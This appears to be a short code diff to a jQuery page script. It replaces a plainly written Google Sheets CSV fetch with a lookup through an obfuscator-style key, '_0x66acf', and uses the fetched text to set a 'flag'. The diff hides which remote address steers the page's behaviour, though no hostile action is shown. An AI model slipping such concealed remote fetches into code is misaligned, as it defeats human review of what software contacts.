@@ -40,9 +40,7 @@ $(document).ready(function () {
   } 
   
 
-  fetch(
-    "https://docs.google.com/spreadsheets/d/e/2PACX-1vT5AeaNQiGQU8WYNKagxCiwFp36LRaX0w06oFleiz14NNb0_YgVxY2VpP8C4PeBi2gu6qwwcC8IlzZA/pub?gid=0&single=true&output=csv"
-  )
+  fetch(up.get("_0x66acf"))
     .then((response) => response.text())
     .then((data) => {
       let flag =
